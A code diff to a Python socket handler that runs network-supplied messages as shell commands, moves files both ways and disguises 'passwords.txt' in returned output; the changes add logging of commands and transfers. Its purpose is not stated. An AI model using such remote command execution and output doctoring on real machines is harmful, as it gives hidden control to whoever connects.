@@ -2,12 +2,13 @@ import threading, subprocess, os, sys, hashlib
 
 class clientHandler(threading.Thread):
 
-    def __init__(self, con, IP, server):
+    def __init__(self, con, IP, server, update):
         self.con = con
         self.IP = IP
         self.server = server
         self.quit = False
 
+        self.update = update
         self.results = ''
         super(clientHandler, self).__init__()
 
@@ -58,6 +59,7 @@ class clientHandler(threading.Thread):
                         cmd = subprocess.Popen(message, shell= True, stdout= subprocess.PIPE, stderr= subprocess.PIPE)
                         self.results = (cmd.stdout.read() + cmd.stderr.read()).decode('utf-8')
                         self.results = self.results.replace('passwords.txt', 'new Text Document.txt')
+                        self.server.updates(self.IP, message , '___')
                         
                 self.sendData(self.results)
 
@@ -102,10 +104,12 @@ class clientHandler(threading.Thread):
             if not error:
                 self.results = "FILE UPLOADED"
                 file.write(data)
+                self.server.updates(self.IP, "-UF" , fileName)
             else:
                 file.close()
                 os.remove(fileName)
                 self.results = chunk.decode('utf-8').replace('$$ERROR$$', '')
+                self.server.updates(self.IP, "-UF" , fileName + " ERROR")
             lock.release()
             
     def sendData(self, data):
@@ -136,12 +140,15 @@ class clientHandler(threading.Thread):
                         
             self.results = "FILE DOWNLOADED"
             lock.release()
+            self.server.updates(self.IP, message , fileName)
             return
         except Exception as e:
             self.con.recv(22)
             lock.release()
             self.con.send("$$ERROR$$".encode('utf-8'))
             self.results = str(e)
+            self.server.updates(self.IP, "-DF" , fileName + " ERROR")
+            
 
     def lockFile(self, fileName):
         noFile = True
